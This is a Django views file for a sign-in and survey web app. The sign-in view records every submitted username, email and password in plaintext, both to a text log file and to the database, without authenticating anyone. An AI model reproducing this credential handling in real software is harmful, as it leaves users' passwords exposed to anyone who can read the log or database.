from django.shortcuts import render, redirect
from .forms import SignInForm, SurveyForm
from .models import Login

# Create your views here.


def signin_view(request):
    if request.method == "POST":
        form = SignInForm(request.POST)
        if form.is_valid():  # Check if the form is valid
            username = form.cleaned_data["username"]   # Get the username
            email = form.cleaned_data["email"]
            password = form.cleaned_data["password"]

            # Store the username in session for later user, Make sure this key matches everywhere
            request.session["username"] = username

            # Check if this user already exists in the login logs
            if not check_existing_user(email, password):
                # Log to txt file if the user is new
                with open("login_logs.txt", "a") as log_file:
                    log_file.write(f"Username: {username}, Email: {
                                   email}, Password: {password}\n")

                # Save to the database
                login = Login(username=username,
                              email=email, password=password)
                login.save()

            # Redirect to survey page
            # Ensure this matches the name in the url
            return redirect('survey:survey')
    else:
        form = SignInForm
    return render(request, "signin.html", {'form': form})


def check_existing_user(email, password):
    # This function will check if the user with the same email/password exists in the log file
    with open("login_logs.txt", "r") as log_file:
        for line in log_file:
            if f"Email: {email}, Password: {password}" in line:
                return True
    return False


def survey_view(request):
    if request.method == "POST":
        form = SurveyForm(request.POST)
        if form.is_valid():
            # Assuming the username is stored in the session after login, Retrieve 'username', not 'user'
            username = request.session.get("username")

            if username is None:
                # Handle caser where user is not logged in, maybe redirect to sign-in page
                return redirect(to='survey:signin')

            # Log the survey responses to a text file
            with open(file="survey.txt", mode="a") as survey_file:
                survey_file.write(f"Username: {username}\n")
                for field_name, field_value in form.cleaned_data.items():
                    survey_file.write(f"{field_name}: {field_value}\n")
                survey_file.write("\n")   # Add a newline after each entry

            # All questions answered, redirect to completion page
            return redirect("survey:completion")
        else:
            # Count unanswered questions, notify user of unanswered questions
            unanswered = len([field for field in form if not field.value()])
            return render(request, "survey.html", context={'form': form, 'error': f"{unanswered} unanswered questions"})

    # GET request, show the empty form
    form = SurveyForm()
    return render(request, "survey.html", {'form': form})


def completion_view(request):
    return render(request, "completion.html")


def landing_page_view(request):
    return render(request=request, template_name="landing_page.html")
